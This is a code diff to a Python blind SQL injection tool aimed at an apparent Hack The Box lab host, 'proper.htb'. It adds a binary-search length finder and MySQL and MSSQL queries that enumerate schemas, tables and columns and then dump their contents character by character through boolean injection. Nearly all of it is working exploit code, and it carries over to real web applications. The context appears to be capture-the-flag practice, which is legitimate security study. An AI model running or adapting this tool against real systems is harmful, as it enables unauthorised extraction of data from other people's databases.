@@ -3,6 +3,7 @@ import sys
 import concurrent.futures
 import hashlib
 from bs4 import BeautifulSoup
+from math import ceil
 
 def inject(payload): ## function that returns True in the case of a success condition
     url = "http://proper.htb:80/products-ajax.php"
@@ -14,37 +15,86 @@ def inject(payload): ## function that returns True in the case of a success cond
     return True
     
     
+
+def get_length(length_query):
+    #Check if field exists
+    is_null = f"SELECT ISNULL(({length_query}))"
+    if inject(is_null):
+        return "NULL"
+
+    #Get min and max lengths    
+    max_length = 10
+    min_length = 1
+    while True:
+        payload = f"SELECT ({length_query}) < {max_length + 1}"
+        if inject(payload):
+            break
+        min_length = max_length + 1
+        max_length *= 10
+        if max_length >= 100000:
+            return "NULL"
+
+    # Binary Search to find the length
+    while True:
+        current = min_length + ceil((max_length - min_length) / 2)
+        payload = f"SELECT ({length_query}) < {current}"
+        if inject(payload):
+            max_length = current - 1
+        else:
+            min_length = current
+
+        if max_length == min_length:
+            return max_length
+
+
 def extract_data(data, dbms=None, database=None, table=None, column=None, order=None, thread=0):
     if data == "version":
-        query = r"SELECT @@VERSION"
+        query = "SELECT @@VERSION"
     elif data == "dbs":
         if dbms == "MSSQL":
-            query = fr"SELECT db_name({thread})"
+            query = f"SELECT db_name({thread})"
         elif dbms == "MYSQL":
-            query = fr"SELECT concat(schema_name) FROM information_schema.schemata ORDER BY concat(schema_name) LIMIT {thread},1"
+            query = f"SELECT schema_name FROM information_schema.schemata ORDER BY schema_name LIMIT {thread},1"
+            length_query = f"SELECT length(schema_name) FROM information_schema.schemata ORDER BY schema_name LIMIT {thread},1"
         else:
             print("Dbms must be MYSQL or MSSQL")
             sys.exit()
     elif data == "tables":
         if dbms == "MSSQL":
-            query = fr"SELECT name FROM {database}..sysobjects WHERE xtype='U' ORDER BY name OFFSET {thread} ROW FETCH NEXT 1 ROW ONLY"
+            query = f"SELECT name FROM {database}..sysobjects WHERE xtype='U' ORDER BY name OFFSET {thread} ROW FETCH NEXT 1 ROW ONLY"
         if dbms == "MYSQL":
-            query = fr"SELECT concat(table_name) FROM information_schema.tables WHERE table_schema='{database}' ORDER BY concat(table_name) LIMIT {thread},1"
+            query = f"SELECT table_name FROM information_schema.tables WHERE table_schema='{database}' ORDER BY table_name LIMIT {thread},1"
+            length_query = f"SELECT length(table_name) FROM information_schema.tables WHERE table_schema='{database}' ORDER BY table_name LIMIT {thread},1"
     elif data == "columns":
         if dbms == "MSSQL":
-            query = fr"SELECT column_name FROM {database}.information_schema.COLUMNS WHERE table_name='{table}' ORDER BY 1 ASC OFFSET {thread} ROW FETCH NEXT 1 ROW ONLY"
+            query = f"SELECT column_name FROM {database}.information_schema.COLUMNS WHERE table_name='{table}' ORDER BY 1 ASC OFFSET {thread} ROW FETCH NEXT 1 ROW ONLY"
         if dbms == "MYSQL":
-            query = fr"SELECT concat(column_name) FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}' ORDER BY concat(column_name) LIMIT {thread},1"
+            query = f"SELECT column_name FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}' ORDER BY column_name LIMIT {thread},1"
+            length_query = f"SELECT length(column_name) FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}' ORDER BY column_name LIMIT {thread},1"
     elif data == "dump":
         if dbms == "MSSQL":
-            query = fr"SELECT CAST({column} AS VARCHAR(4000)) FROM {database}..{table} ORDER BY {order} ASC OFFSET {thread} ROW FETCH NEXT 1 ROW ONLY"
+            query = f"SELECT CAST({column} AS VARCHAR(4000)) FROM {database}..{table} ORDER BY {order} ASC OFFSET {thread} ROW FETCH NEXT 1 ROW ONLY"
         if dbms == "MYSQL":
-            query = fr"SELECT {column} FROM {database}.{table} ORDER BY {order} LIMIT {thread},1"
-    skeleton = r"ASCII(SUBSTRING(({}),{},1)) <={}"
+            query = f"SELECT {column} FROM {database}.{table} ORDER BY {order} LIMIT {thread},1"
+            length_query = f"SELECT length({column}) FROM {database}.{table} ORDER BY {order} LIMIT {thread},1"
+
+    if data != "version":
+        length = get_length(length_query)
+        if length == "NULL":
+            if data == "dump":
+                return [thread+1, "NULL"]
+            else:
+                return "NULL"
+
+    else:
+        length = 50
+    skeleton = "ASCII(SUBSTRING(({}),{},1)) <={}"
     current_char = 1
     output = ""
     done = False
     while True:
+        if len(output) == length:
+            break
         maximum = 127
         minimum = 32
         while True:
@@ -68,6 +118,8 @@ def extract_data(data, dbms=None, database=None, table=None, column=None, order=
             break
         if data == "version":
             print("\r" + output, end="", flush=True)
+            if output.endswith("  "):
+                break
     if data == "version":
         print("\n")
     if data == "dump":
@@ -117,7 +169,7 @@ def process_input(database=None, table=None, column=None):
             if data == "dump":
                 for x in all_output:
                     for i in concurrent.futures.as_completed(x):
-                        if i.result()[1]:
+                        if i.result()[1] != "NULL":
                             if i.result()[0] in dump:
                                 dump[i.result()[0]].append(i.result()[1])
                             else:
@@ -130,7 +182,7 @@ def process_input(database=None, table=None, column=None):
                 
             else:
                 for i in concurrent.futures.as_completed(output):
-                    if i.result():                        
+                    if i.result() != "NULL":                        
                         print(i.result())
                     else:
                         done = True
